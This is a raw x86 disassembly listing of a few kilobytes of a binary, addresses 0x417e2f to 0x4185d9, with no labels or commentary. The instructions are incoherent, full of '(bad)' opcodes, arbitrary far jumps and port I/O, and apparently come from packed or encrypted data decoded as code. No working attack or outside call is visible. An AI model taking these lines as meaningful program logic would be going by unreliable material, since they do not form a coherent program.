  417e2f:	xor    al,0xa3
  417e31:	jnp    0x417dba
  417e33:	retf   0xb6f
  417e36:	push   ss
  417e37:	fucomip st,st(1)
  417e39:	jmp    0x3e59:0x9ab9248e
  417e40:	mov    WORD PTR [ecx-0x44],ss
  417e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e44:	xchg   BYTE PTR [edi-0x392d5e1a],ah
  417e4a:	(bad)  [edi]
  417e4c:	inc    ecx
  417e4d:	and    eax,0x7308cb43
  417e52:	dec    esi
  417e53:	sbb    esp,ecx
  417e55:	mov    ch,0x52
  417e57:	rcl    BYTE PTR [edx],0xac
  417e5a:	in     eax,0xe
  417e5c:	or     ecx,DWORD PTR fs:[edi]
  417e5f:	sub    ch,BYTE PTR [ebp-0x6e]
  417e62:	xor    DWORD PTR [ebx+ebp*2+0x379a52bd],0xffffffab
  417e6a:	and    ch,dl
  417e6c:	xchg   edx,eax
  417e6d:	add    eax,0x295a39e4
  417e72:	(bad)  
  417e73:	pusha  
  417e74:	(bad)  
  417e76:	mov    ah,0x48
  417e78:	in     eax,dx
  417e79:	imul   ecx,DWORD PTR [edi-0x367dd874],0xfc987570
  417e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e84:	pop    es
  417e85:	jo     0x417e99
  417e87:	cmp    eax,0x7d9eb998
  417e8c:	cmp    bl,BYTE PTR [eax-0x48]
  417e8f:	std    
  417e90:	or     al,0xa2
  417e92:	out    dx,al
  417e93:	popa   
  417e94:	leave  
  417e95:	into   
  417e96:	xor    cl,BYTE PTR [esi]
  417e98:	and    eax,DWORD PTR [eax]
  417e9a:	pop    es
  417e9b:	xchg   ebp,eax
  417e9c:	sbb    DWORD PTR [ebx],0x369892b1
  417ea2:	or     eax,0x1961966
  417ea7:	das    
  417ea8:	pop    ss
  417ea9:	adc    DWORD PTR [eax+0xfa426b7],edi
  417eaf:	(bad)  
  417eb1:	jb     0x417ecc
  417eb3:	out    dx,al
  417eb4:	adc    DWORD PTR [eax-0x24],eax
  417eb7:	scas   al,BYTE PTR es:[edi]
  417eb8:	aaa    
  417eb9:	es mov edi,0xaf8fde7
  417ebf:	(bad)  
  417ec0:	and    al,0x58
  417ec2:	dec    eax
  417ec3:	mov    cl,0x11
  417ec5:	cmp    al,0xb1
  417ec7:	and    esp,edi
  417ec9:	mov    ebp,DWORD PTR [ecx]
  417ecb:	push   cs
  417ecc:	leave  
  417ecd:	sbb    edx,ecx
  417ecf:	mov    ebp,0x72cd1c29
  417ed4:	data16 jecxz 0x417e60
  417ed7:	loopne 0x417f3e
  417ed9:	cs dec esi
  417edb:	(bad)  
  417edc:	dec    ebx
  417edd:	xchg   BYTE PTR [esi],ch
  417edf:	call   0xd58:0xe12dafd7
  417ee6:	(bad)  
  417ee7:	outs   dx,DWORD PTR ds:[si]
  417ee9:	sbb    BYTE PTR [esi-0x34],0x1a
  417eed:	cmp    al,0x1c
  417eef:	les    ebp,FWORD PTR [esi]
  417ef1:	adc    BYTE PTR [ecx],bh
  417ef3:	sbb    ecx,esi
  417ef5:	add    eax,0x7ebc77f4
  417efa:	(bad)  
  417efb:	sar    ecx,0x81
  417efe:	adc    al,0x3c
  417f00:	pop    edx
  417f01:	in     al,dx
  417f02:	ins    BYTE PTR es:[edi],dx
  417f03:	stos   BYTE PTR es:[edi],al
  417f04:	fisttp QWORD PTR [edi-0x25d7e458]
  417f0a:	and    bl,al
  417f0c:	fdivp  st(1),st
  417f0e:	das    
  417f0f:	fldcw  WORD PTR [ebp+0x59]
  417f12:	es sar al,1
  417f15:	retf   
  417f16:	sub    BYTE PTR [esp+eax*4+0x10],dh
  417f1a:	mov    bh,0x49
  417f1c:	ror    DWORD PTR [ebx-0x73482259],cl
  417f22:	cdq    
  417f23:	mov    esp,0xa8cad0e4
  417f28:	out    0x97,al
  417f2a:	fcom   DWORD PTR [edx-0x75]
  417f2d:	push   es
  417f2e:	xor    DWORD PTR [edx],edi
  417f30:	cmp    al,0xc0
  417f32:	push   ecx
  417f33:	aaa    
  417f34:	push   ecx
  417f35:	into   
  417f36:	(bad)  
  417f37:	sub    ebx,DWORD PTR ds:0x49394342
  417f3d:	cld    
  417f3e:	adc    al,0xa7
  417f40:	adc    DWORD PTR [ecx],0x9a749a2e
  417f46:	or     ebp,edx
  417f48:	repz mov ch,0x39
  417f4b:	repz out dx,eax
  417f4d:	repnz or DWORD PTR [ebx+0x2],ecx
  417f51:	dec    ecx
  417f52:	xchg   ebx,eax
  417f53:	and    edx,DWORD PTR [eax]
  417f55:	push   esi
  417f56:	lods   al,BYTE PTR ds:[esi]
  417f57:	and    eax,DWORD PTR [edx]
  417f59:	adc    edx,edx
  417f5b:	hlt    
  417f5c:	test   al,0xe3
  417f5e:	call   0xe64920b0
  417f63:	mov    DWORD PTR [ebx-0x3f],edi
  417f66:	add    eax,0xe4744121
  417f6b:	scas   al,BYTE PTR es:[edi]
  417f6c:	data16 data16 fild DWORD PTR [ecx-0x2]
  417f71:	add    cl,cl
  417f73:	or     ebx,DWORD PTR [ebp+0x10]
  417f76:	and    BYTE PTR [ebp-0x4e],bh
  417f79:	icebp  
  417f7a:	icebp  
  417f7b:	adc    al,0xb3
  417f7d:	loop   0x417f02
  417f7f:	fs pop ebx
  417f81:	in     al,dx
  417f82:	sub    DWORD PTR [eax+0x15],edx
  417f85:	cmp    al,0xb7
  417f87:	push   edi
  417f88:	pop    ss
  417f89:	mov    edi,DWORD PTR [edi+0x1d8a82c]
  417f8f:	adc    BYTE PTR [esi+ebx*2+0x4901fe6c],ah
  417f96:	jmp    0x33b2:0x2d29a3ac
  417f9d:	adc    ah,bl
  417f9f:	add    esi,edx
  417fa1:	(bad)  
  417fa2:	xor    BYTE PTR [eax-0x2c],dl
  417fa5:	cmp    DWORD PTR [ecx],ecx
  417fa7:	jle    0x417f3c
  417fa9:	test   DWORD PTR [esi],0xf7d6c161
  417faf:	ja     0x417fab
  417fb1:	mov    ch,BYTE PTR [edx+0x50e88cf0]
  417fb7:	jg     0x41800e
  417fb9:	popf   
  417fba:	shr    DWORD PTR [edx*2-0x332cd758],0x50
  417fc2:	dec    esi
  417fc3:	call   0x89e2:0xc7676d17
  417fca:	dec    eax
  417fcb:	dec    ebx
  417fcc:	adc    eax,0xd468b81
  417fd1:	out    dx,al
  417fd2:	or     al,0x34
  417fd4:	jge    0x417fe2
  417fd6:	jo     0x417f66
  417fd8:	cwde   
  417fd9:	popf   
  417fda:	(bad)  
  417fdb:	push   ss
  417fdc:	aam    0xe3
  417fde:	and    edx,ebp
  417fe0:	pop    ds
  417fe1:	stos   DWORD PTR es:[edi],eax
  417fe2:	jae    0x417f99
  417fe4:	cmp    al,0x57
  417fe6:	je     0x417fc5
  417fe8:	arpl   WORD PTR [edx+0x3f06eb94],cx
  417fee:	adc    dh,BYTE PTR [ebp-0x2bacaf4d]
  417ff4:	mov    bl,0x77
  417ff6:	cmc    
  417ff7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ff9:	popa   
  417ffa:	js     0x417f9f
  417ffc:	xor    BYTE PTR [esi-0xb4a6baa],bl
  418002:	int    0xb
  418004:	sub    bl,BYTE PTR [edx+0x10]
  418007:	mov    ah,0x74
  418009:	mov    al,ds:0xe675a76
  41800e:	push   cs
  41800f:	rcl    BYTE PTR [eax-0x1b],cl
  418012:	in     eax,0xfa
  418014:	hlt    
  418015:	stos   DWORD PTR es:[edi],eax
  418016:	mov    esi,0x3f84a793
  41801b:	sub    al,BYTE PTR [ecx+0x4413a704]
  418021:	sbb    BYTE PTR [eax-0x378b407],0x4f
  418028:	sub    DWORD PTR [ebp+0x73935e63],0xfbbf9de2
  418032:	out    0xbb,eax
  418034:	clc    
  418035:	ja     0x418043
  418037:	enter  0xb4e4,0x1d
  41803b:	push   ebp
  41803c:	fisttp DWORD PTR [esi]
  41803e:	mov    edi,0x2ac7b0d6
  418043:	xchg   edi,eax
  418044:	(bad)  
  418045:	jns    0x418000
  418047:	add    ebp,DWORD PTR [edi+0x59772694]
  41804d:	fdivp  st(5),st
  41804f:	dec    esp
  418050:	or     dl,0x53
  418053:	call   0x5c8e:0xfe2e2794
  41805a:	scas   al,BYTE PTR es:[edi]
  41805b:	pusha  
  41805c:	cmp    ebp,DWORD PTR [esi]
  41805e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41805f:	sub    ecx,edx
  418061:	xchg   cl,dl
  418063:	xlat   BYTE PTR ds:[ebx]
  418064:	pop    ebp
  418065:	add    esi,eax
  418067:	ins    BYTE PTR es:[edi],dx
  418068:	mov    bl,ch
  41806a:	pop    ds
  41806b:	sub    BYTE PTR [ebp-0x40],dl
  41806e:	mov    ebp,0x3069fea2
  418073:	pop    esi
  418074:	std    
  418075:	add    bh,BYTE PTR [ebx]
  418077:	cdq    
  418078:	and    eax,0x241f0377
  41807d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41807e:	jnp    0x41803a
  418080:	fcmovnb st,st(5)
  418082:	ins    DWORD PTR es:[edi],dx
  418083:	mov    ds:0xe3ed273a,al
  418088:	mov    ecx,0x4cc722b4
  41808d:	sar    DWORD PTR [edi],0xfe
  418090:	in     eax,dx
  418091:	add    ah,BYTE PTR [edi+0x31f31ed4]
  418097:	mov    eax,0x10ae95ca
  41809c:	xlat   BYTE PTR ds:[ebx]
  41809d:	mov    DWORD PTR [ecx-0x5a],esi
  4180a0:	jbe    0x41802f
  4180a2:	(bad)  
  4180a3:	fldcw  WORD PTR [edi+0x2]
  4180a6:	mov    fs,WORD PTR [eax-0x42]
  4180a9:	or     ebp,DWORD PTR [ebx]
  4180ab:	loope  0x418103
  4180ad:	pop    ss
  4180ae:	and    al,0x68
  4180b0:	mov    cl,BYTE PTR [esi+0x6c2dc7b7]
  4180b6:	fdivr  st,st(1)
  4180b8:	les    edi,FWORD PTR ds:0x93b4c480
  4180be:	mov    ah,0x16
  4180c0:	fs inc ebx
  4180c2:	out    dx,al
  4180c3:	in     al,dx
  4180c4:	aaa    
  4180c5:	mul    cl
  4180c7:	les    esi,FWORD PTR [ecx-0x2a2f5e27]
  4180cd:	into   
  4180ce:	adc    BYTE PTR [eax],al
  4180d0:	inc    eax
  4180d1:	or     al,0x19
  4180d3:	sub    eax,0x666966b4
  4180d8:	pop    edi
  4180d9:	pop    edx
  4180da:	jl     0x4180c2
  4180dc:	or     ah,ch
  4180de:	mov    ecx,0xd99bed58
  4180e3:	lods   al,BYTE PTR ds:[esi]
  4180e4:	sub    dl,dl
  4180e6:	sbb    ebx,ebx
  4180e8:	sbb    eax,0xb62079d7
  4180ed:	dec    ecx
  4180ee:	cld    
  4180ef:	fadd   DWORD PTR [ebx+eax*1+0x25]
  4180f3:	add    BYTE PTR [edi-0x61],ch
  4180f6:	push   cs
  4180f7:	adc    DWORD PTR ds:0x696d6401,0x71
  4180fe:	int    0x1f
  418100:	das    
  418101:	add    edx,DWORD PTR [ecx]
  418103:	add    BYTE PTR [ecx+0x2594c6a0],0x92
  41810a:	leave  
  41810b:	not    ebp
  41810d:	repz sub cl,BYTE PTR [ecx]
  418110:	jbe    0x41813f
  418112:	js     0x4180af
  418114:	scas   al,BYTE PTR es:[edi]
  418115:	cmc    
  418116:	pop    ecx
  418117:	jl     0x418196
  418119:	shr    BYTE PTR [ebp+ebp*1+0x4a2578ed],0xbf
  418121:	sub    al,0x92
  418123:	repz ds mov edi,0x2537e2fe
  41812a:	call   0x4a64:0x96a1e3fa
  418131:	inc    esp
  418132:	jmp    0xf1fb:0xa2860e2f
  418139:	adc    dh,BYTE PTR [ebp-0x62]
  41813c:	sbb    eax,0xcb3d6fe7
  418141:	iret   
  418142:	repnz push eax
  418144:	aad    0x9b
  418146:	je     0x4180ec
  418148:	dec    esp
  418149:	sbb    eax,0x8d76b61a
  41814e:	call   0x7ce9:0xdc8f0c67
  418155:	adc    eax,DWORD PTR [edx+0x1b9b27ce]
  41815b:	mov    esi,ecx
  41815d:	ins    BYTE PTR es:[edi],dx
  41815e:	sbb    al,BYTE PTR fs:[esi]
  418161:	mov    edi,0xcd059164
  418166:	iret   
  418167:	cmp    ah,0x1
  41816a:	(bad)  
  41816b:	lods   eax,DWORD PTR ds:[esi]
  41816c:	cmp    eax,0x348cadc0
  418171:	les    edx,FWORD PTR [eax-0x28]
  418174:	cmp    al,0x77
  418176:	sahf   
  418177:	xor    eax,0xc3287614
  41817c:	xor    DWORD PTR [edi+0x46],0x43
  418180:	daa    
  418181:	push   esi
  418182:	mov    ecx,0xdbe6d7cc
  418187:	aam    0xde
  418189:	lods   al,BYTE PTR ds:[esi]
  41818a:	xchg   edx,eax
  41818b:	fst    QWORD PTR fs:[eax]
  41818e:	xchg   esi,eax
  41818f:	dec    eax
  418190:	xchg   ebp,eax
  418191:	and    eax,DWORD PTR [edx-0x41]
  418194:	pop    esp
  418195:	push   esi
  418196:	shl    BYTE PTR [edx],0x22
  418199:	test   BYTE PTR [ebx],ch
  41819b:	pop    es
  41819c:	stc    
  41819d:	sub    ebp,DWORD PTR ss:[ebx-0xb]
  4181a1:	mov    al,ds:0x1c5f5511
  4181a6:	popf   
  4181a7:	and    dh,BYTE PTR [ecx+0x29]
  4181aa:	or     DWORD PTR [edi-0x15f187f9],edi
  4181b0:	xor    al,0x82
  4181b2:	cmp    BYTE PTR [ecx],ah
  4181b4:	in     al,dx
  4181b5:	aas    
  4181b6:	jb     0x4181cb
  4181b8:	je     0x4181d7
  4181ba:	mov    dh,BYTE PTR [eax+0x75ffa4b5]
  4181c0:	pop    eax
  4181c1:	adc    BYTE PTR [esi-0x732da98d],ch
  4181c7:	push   edx
  4181c8:	sti    
  4181c9:	or     BYTE PTR [esi+0x13],ch
  4181cc:	mov    ch,0x9b
  4181ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181cf:	or     DWORD PTR ds:0x47d27a94,0xe73a0dc8
  4181d9:	cmc    
  4181da:	test   edx,0xe62bbdb1
  4181e0:	add    al,0x51
  4181e2:	and    esi,esi
  4181e4:	jb     0x4181d2
  4181e6:	aad    0xb1
  4181e8:	push   ds
  4181e9:	sub    bh,BYTE PTR [ecx+0x690c26c3]
  4181ef:	(bad)  
  4181f0:	fcmovu st,st(1)
  4181f2:	jno    0x41820d
  4181f4:	push   ds
  4181f5:	push   cs
  4181f6:	jmp    0xd27b6025
  4181fb:	cdq    
  4181fc:	lods   al,BYTE PTR ds:[esi]
  4181fd:	jp     0x41820c
  4181ff:	jo     0x418242
  418201:	push   0xffffffb2
  418203:	lea    ebp,[esi]
  418205:	(bad)  
  418206:	pop    ss
  418207:	push   es
  418208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418209:	rcl    DWORD PTR [eax-0x1d],cl
  41820c:	int3   
  41820d:	in     eax,dx
  41820e:	xchg   dl,dl
  418210:	sbb    eax,0x715d3683
  418215:	sbb    dl,BYTE PTR [ebx]
  418217:	int    0xa3
  418219:	add    al,BYTE PTR [esi-0x50]
  41821c:	sar    DWORD PTR [ecx],1
  41821e:	sbb    DWORD PTR [ecx+edx*2-0x64],ebp
  418222:	inc    DWORD PTR [eax+0x6a5acb8d]
  418228:	cmp    dl,BYTE PTR [eax+0x211f38d8]
  41822e:	outs   dx,DWORD PTR ds:[esi]
  41822f:	jno    0x418257
  418231:	pop    ebx
  418232:	dec    bl
  418234:	je     0x41827f
  418236:	and    cl,BYTE PTR [ebp-0x7c]
  418239:	push   edi
  41823a:	or     dl,dl
  41823c:	sbb    al,0x8c
  41823e:	mov    esi,0xd738750
  418243:	into   
  418244:	dec    eax
  418245:	(bad)  
  418247:	mov    DWORD PTR [eax-0x676fd98b],0x433b3611
  418251:	xlat   BYTE PTR ds:[ebx]
  418252:	sbb    eax,0x6349ce21
  418257:	and    ebp,DWORD PTR [edi+0x597def01]
  41825d:	popa   
  41825e:	clc    
  41825f:	lods   al,BYTE PTR ds:[esi]
  418260:	and    BYTE PTR [edi],0x40
  418263:	xchg   BYTE PTR [ebp-0x3df9b1ff],cl
  418269:	cmp    esp,DWORD PTR [edi-0x34cac13]
  41826f:	xor    BYTE PTR [eax],cl
  418271:	dec    ebx
  418272:	push   ebp
  418273:	push   ecx
  418274:	jge    0x41827a
  418276:	repz aad 0x1d
  418279:	rcr    BYTE PTR [edx],1
  41827b:	cdq    
  41827c:	popa   
  41827d:	jle    0x418281
  41827f:	inc    eax
  418280:	outs   dx,BYTE PTR ds:[esi]
  418281:	std    
  418282:	mul    ecx
  418284:	push   esi
  418285:	cwde   
  418286:	in     al,dx
  418287:	jmp    0x418269
  418289:	add    eax,0xc97851a
  41828e:	ror    BYTE PTR [ebp-0x74],cl
  418291:	and    BYTE PTR [ecx],0xbd
  418294:	stc    
  418295:	push   esp
  418296:	or     BYTE PTR [edi-0x76c5f0e2],bl
  41829c:	cmp    BYTE PTR [eax],cl
  41829e:	adc    ch,BYTE PTR [ebp-0x737eb8cd]
  4182a4:	xchg   DWORD PTR [eax],esi
  4182a6:	mov    ecx,0xbf4698eb
  4182ab:	dec    edx
  4182ac:	or     eax,0x844a00df
  4182b1:	xchg   edx,eax
  4182b2:	dec    dh
  4182b4:	add    bh,BYTE PTR [esi+0x1cb747b9]
  4182ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182bb:	in     eax,0x68
  4182bd:	or     esi,ebx
  4182bf:	shl    BYTE PTR [ecx+0x1f],0x3f
  4182c3:	fdivrp st(0),st
  4182c5:	imul   edx,DWORD PTR [ecx+0x5d],0xfffffff0
  4182c9:	outs   dx,BYTE PTR ds:[esi]
  4182ca:	add    dl,BYTE PTR [eax+ecx*1-0x78]
  4182ce:	push   cs
  4182cf:	data16 das 
  4182d1:	sbb    ebx,edx
  4182d3:	addr16 cs xchg edi,eax
  4182d6:	dec    edi
  4182d7:	add    DWORD PTR [ecx+eiz*8+0x374da216],ebx
  4182de:	push   esp
  4182df:	sub    ebp,0x50
  4182e2:	mov    bl,0x6b
  4182e4:	lock mov ebx,0x39682c3b
  4182ea:	or     DWORD PTR [edi],ebx
  4182ec:	or     eax,0x764c3065
  4182f1:	stos   WORD PTR es:[edi],ax
  4182f3:	or     ebx,DWORD PTR [esi+ebx*4+0x2de7f54]
  4182fa:	ffree  st(0)
  4182fc:	ins    DWORD PTR es:[edi],dx
  4182fd:	cmp    eax,0x82a1cb79
  418302:	mov    esi,0x6a49922e
  418307:	dec    ebx
  418308:	pop    edx
  418309:	mov    ecx,0x42f6215
  41830e:	lea    eax,[ebx-0x3562c0dc]
  418314:	xchg   esi,eax
  418315:	xor    esi,esp
  418317:	mov    fs,WORD PTR [edx+0x68]
  41831a:	or     eax,0x18df7135
  41831f:	stos   DWORD PTR es:[edi],eax
  418320:	ss jno 0x4183a0
  418323:	ins    DWORD PTR es:[edi],dx
  418324:	xor    BYTE PTR [ebp+ecx*8-0x1a],dl
  418328:	inc    eax
  418329:	add    edx,esp
  41832b:	sbb    eax,0x3faf1c95
  418330:	daa    
  418331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418332:	(bad)  
  418333:	cmp    al,BYTE PTR [edx+0x10]
  418336:	hlt    
  418337:	inc    edx
  418338:	ds dec eax
  41833a:	aas    
  41833b:	pop    ebp
  41833c:	aaa    
  41833d:	push   0x36
  41833f:	ss dec ecx
  418341:	icebp  
  418342:	aam    0x8c
  418344:	sbb    dl,BYTE PTR [ebx+0x3cd2e635]
  41834a:	adc    DWORD PTR [edi+0x7a],edi
  41834d:	out    dx,al
  41834e:	mov    edx,0xd851c1a3
  418353:	lods   eax,DWORD PTR ds:[esi]
  418354:	fistp  QWORD PTR [ebx+0x45]
  418357:	mov    es,WORD PTR [eax-0x47]
  41835a:	dec    edx
  41835b:	jae    0x418319
  41835d:	int3   
  41835e:	ss sub eax,0x97dba6b3
  418364:	es xor eax,0xcaeaf4fa
  41836a:	stos   BYTE PTR es:[edi],al
  41836b:	sbb    BYTE PTR [edi-0x75],bh
  41836e:	lock xchg edi,eax
  418370:	cmc    
  418371:	int    0x5c
  418373:	lods   eax,DWORD PTR ds:[esi]
  418374:	pop    edx
  418375:	adc    cl,BYTE PTR [ebp-0x12]
  418378:	dec    edi
  418379:	stos   BYTE PTR es:[edi],al
  41837a:	xchg   ebx,eax
  41837b:	imul   DWORD PTR [eax]
  41837d:	cdq    
  41837e:	int3   
  41837f:	xadd   DWORD PTR [esi+0x46589409],ebp
  418386:	daa    
  418387:	(bad)  
  418388:	adc    cl,BYTE PTR [esi-0x30]
  41838b:	xchg   edi,eax
  41838c:	call   0xa3eb:0xb943de35
  418393:	rcr    esp,0x8a
  418396:	cmp    edx,DWORD PTR [eax]
  418398:	dec    ebx
  418399:	mov    dh,0x9d
  41839b:	ret    0xe75
  41839e:	mov    ebx,0x10dd798c
  4183a3:	ret    0x7c2e
  4183a6:	bound  esi,QWORD PTR [ecx-0x75c55a20]
  4183ac:	scas   eax,DWORD PTR es:[edi]
  4183ad:	test   BYTE PTR [esi-0x1c],cl
  4183b0:	fadd   st,st(2)
  4183b2:	pop    eax
  4183b3:	imul   ecx,DWORD PTR [eax],0x68
  4183b6:	jb     0x4183fe
  4183b8:	mov    eax,ds:0x65462a4
  4183bd:	fist   WORD PTR [eax+0x655f7ae6]
  4183c3:	out    0xc5,eax
  4183c5:	xor    bh,BYTE PTR [esi+0x5c]
  4183c8:	lahf   
  4183c9:	sbb    al,BYTE PTR [eax+0x76]
  4183cc:	sub    eax,0x20f9e990
  4183d1:	lods   al,BYTE PTR ds:[esi]
  4183d2:	add    al,BYTE PTR [ebp+0xd23af84]
  4183d8:	hlt    
  4183d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183da:	push   edx
  4183db:	arpl   WORD PTR [ebp+0xe],di
  4183de:	sub    BYTE PTR [eax-0x32],0x71
  4183e2:	add    ecx,DWORD PTR [esi]
  4183e4:	add    al,0x57
  4183e6:	cmp    esi,DWORD PTR [ecx+edx*4-0x5e]
  4183ea:	jmp    0xb7b2:0xc94f9ab1
  4183f1:	into   
  4183f2:	mov    bl,0xd8
  4183f4:	xchg   DWORD PTR [edx],esi
  4183f6:	add    al,BYTE PTR [ebx+0x3e2a6602]
  4183fc:	mov    ah,0x54
  4183fe:	cmp    DWORD PTR ds:0xb23ad2ed,0x4a6c570a
  418408:	icebp  
  418409:	jo     0x4183dc
  41840b:	imul   ebx,DWORD PTR [ecx+0x5d826216],0xffffffe3
  418412:	call   0xcef0e02e
  418417:	mov    DWORD PTR [ebx-0x4a6d3d5d],edx
  41841d:	push   ds
  41841e:	sbb    edi,esi
  418420:	push   0x2cfbac33
  418425:	scas   eax,DWORD PTR es:[edi]
  418426:	in     eax,dx
  418427:	hlt    
  418428:	pop    ds
  418429:	push   ebp
  41842a:	jp     0x418414
  41842c:	pop    ds
  41842d:	stos   BYTE PTR es:[edi],al
  41842e:	jmp    0x642699fb
  418433:	data16 out 0xa1,al
  418436:	push   ebp
  418437:	mov    DWORD PTR [ebp-0x567dfc08],esp
  41843d:	cmp    DWORD PTR [ebx-0x38],edi
  418440:	inc    esp
  418441:	popa   
  418442:	aad    0x49
  418444:	add    al,0xb2
  418446:	cwde   
  418447:	pop    ecx
  418448:	jg     0x41845c
  41844a:	cmc    
  41844b:	cmp    BYTE PTR [ebx+0x63],ah
  41844e:	in     eax,dx
  41844f:	cmc    
  418450:	or     bl,BYTE PTR [ebx+0x40]
  418453:	mov    dl,0xe3
  418455:	ds (bad) 
  418457:	(bad)  
  418458:	in     eax,dx
  418459:	imul   ecx,DWORD PTR [ecx+0x5e29789b],0xfc235c09
  418463:	dec    esp
  418464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418465:	dec    ecx
  418466:	or     DWORD PTR [edx],ebx
  418468:	aad    0x1c
  41846a:	cdq    
  41846b:	xor    DWORD PTR [esi+ebx*1-0x7b],eax
  41846f:	out    0x9b,al
  418471:	clc    
  418472:	jns    0x4184cc
  418474:	shr    DWORD PTR [edi],0xa8
  418477:	xchg   DWORD PTR [esi],edi
  418479:	mov    cl,0xb3
  41847b:	jbe    0x418482
  41847d:	xor    DWORD PTR [ecx],esi
  41847f:	arpl   dx,di
  418481:	xchg   edx,eax
  418482:	pushf  
  418483:	ret    
  418484:	lds    edi,FWORD PTR [esi]
  418486:	mov    bh,0xbb
  418488:	or     BYTE PTR [esi-0x44],ah
  41848b:	scas   eax,DWORD PTR es:[edi]
  41848c:	rcr    ebx,cl
  41848e:	sar    DWORD PTR fs:[edi],1
  418491:	aas    
  418492:	addps  xmm5,XMMWORD PTR [esi]
  418495:	sahf   
  418496:	int3   
  418497:	mov    ch,BYTE PTR [edx]
  418499:	or     DWORD PTR [ecx+0x4e],edx
  41849c:	shl    DWORD PTR [ebp-0x5b1eac74],cl
  4184a2:	dec    eax
  4184a3:	mov    cl,0x19
  4184a5:	xor    bl,BYTE PTR [eax-0x1f]
  4184a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a9:	dec    DWORD PTR [esi+esi*1]
  4184ac:	stos   DWORD PTR es:[edi],eax
  4184ad:	clc    
  4184ae:	xor    DWORD PTR [ecx+0x7f],0xffffffcf
  4184b2:	mov    ch,0xde
  4184b4:	out    0xc0,eax
  4184b6:	cmp    DWORD PTR [edi+ebx*4],edx
  4184b9:	add    al,0xca
  4184bb:	pop    esp
  4184bc:	mov    dh,0xd
  4184be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184bf:	mov    ch,0xdb
  4184c1:	fbstp  TBYTE PTR [ecx]
  4184c3:	cwde   
  4184c4:	xor    bl,bh
  4184c6:	jp     0x4184aa
  4184c8:	test   BYTE PTR fs:[ebx-0x1c],0xc5
  4184cd:	sbb    eax,ecx
  4184cf:	loope  0x418463
  4184d1:	in     eax,dx
  4184d2:	cmp    al,0xc0
  4184d4:	sbb    bl,BYTE PTR [ebp+0xe46365b]
  4184da:	cmp    DWORD PTR [esi-0x19],ebp
  4184dd:	rcl    BYTE PTR [ebx-0x3d905a54],0x3d
  4184e4:	call   0x96b085f4
  4184e9:	cmp    DWORD PTR ds:0x116405f1,ebx
  4184ef:	pop    eax
  4184f0:	inc    eax
  4184f1:	or     ebx,edi
  4184f3:	or     esp,esi
  4184f5:	push   ecx
  4184f6:	xchg   esp,eax
  4184f7:	lods   al,BYTE PTR ds:[esi]
  4184f8:	xor    DWORD PTR [ecx],ecx
  4184fa:	mov    al,0x1c
  4184fc:	rcl    DWORD PTR [edi-0x70],1
  4184ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418500:	repz arpl si,bp
  418503:	out    dx,eax
  418504:	dec    esp
  418505:	mov    ecx,0x26c14e8d
  41850a:	xor    edi,DWORD PTR [ebx+0x45]
  41850d:	fcom   DWORD PTR [ebx]
  41850f:	loopne 0x4184be
  418511:	cwde   
  418512:	aam    0x69
  418514:	inc    ebx
  418515:	bound  edx,QWORD PTR [edx+0x4]
  418518:	pop    esi
  418519:	or     al,BYTE PTR [ecx-0x42f00c49]
  41851f:	in     eax,dx
  418520:	scas   eax,DWORD PTR es:[edi]
  418521:	sbb    eax,0x42c9e171
  418526:	fst    DWORD PTR [ebx]
  418528:	xor    al,0x2f
  41852a:	mov    eax,ds:0x434df0f1
  41852f:	cmp    ebx,DWORD PTR [edx-0x245ecc3b]
  418535:	pop    edx
  418536:	dec    edx
  418537:	das    
  418538:	les    ecx,FWORD PTR [ebp+0x2f]
  41853b:	cmp    BYTE PTR ss:[edi+edx*2+0x2d30aac],ch
  418543:	cdq    
  418544:	(bad)  
  418546:	xor    bl,BYTE PTR [edx+0x508dad48]
  41854c:	or     BYTE PTR [ecx],dl
  41854e:	xor    al,0x7b
  418550:	jmp    0x418526
  418552:	jmp    0xde22:0xabbbb82f
  418559:	mov    eax,ds:0x25d33bd3
  41855e:	pop    ebx
  41855f:	or     al,0x90
  418561:	ror    ah,cl
  418563:	mov    ebp,0xeaa60b92
  418568:	shl    DWORD PTR [ecx+eax*8+0x4a7e87c9],cl
  41856f:	stos   BYTE PTR es:[edi],al
  418570:	mov    ds:0xefb349e7,al
  418575:	inc    ebp
  418576:	rol    BYTE PTR [esi+ebp*1+0x39],1
  41857a:	or     eax,0x815435a2
  41857f:	sub    edi,DWORD PTR [ebx+0xeca2b5a]
  418585:	push   ebx
  418586:	inc    edx
  418587:	js     0x4185fa
  418589:	pop    esp
  41858a:	or     DWORD PTR ds:0x5940365b,esi
  418590:	push   ebx
  418591:	data16 int3 
  418593:	retf   0xe890
  418596:	mov    bh,0x51
  418598:	scas   eax,DWORD PTR es:[edi]
  418599:	push   ebp
  41859a:	sti    
  41859b:	push   edx
  41859c:	jl     0x4185dd
  41859e:	jmp    0x3851:0x64e18880
  4185a5:	push   cs
  4185a6:	add    al,0xa3
  4185a8:	outs   dx,DWORD PTR ds:[esi]
  4185a9:	push   ebp
  4185aa:	jne    0x41854a
  4185ac:	sbb    al,0xec
  4185ae:	ins    BYTE PTR es:[edi],dx
  4185af:	cmp    DWORD PTR [edi+esi*1+0x5a],esp
  4185b3:	ss pop ecx
  4185b5:	out    dx,al
  4185b6:	pop    ecx
  4185b7:	sar    BYTE PTR [edx+0x5f6835b5],cl
  4185bd:	and    al,0x8f
  4185bf:	inc    eax
  4185c0:	pop    esi
  4185c1:	mov    cl,0x9f
  4185c3:	dec    esp
  4185c4:	cmp    ch,al
  4185c6:	and    ebp,DWORD PTR ds:0x130ef4f3
  4185cc:	mov    esp,0x9ede8b5d
  4185d1:	repz clc 
  4185d3:	push   ebx
  4185d4:	(bad)  
  4185d5:	and    DWORD PTR [eax+0x13],ebx
  4185d8:	inc    edi
  4185d9:	test   ebx,esi
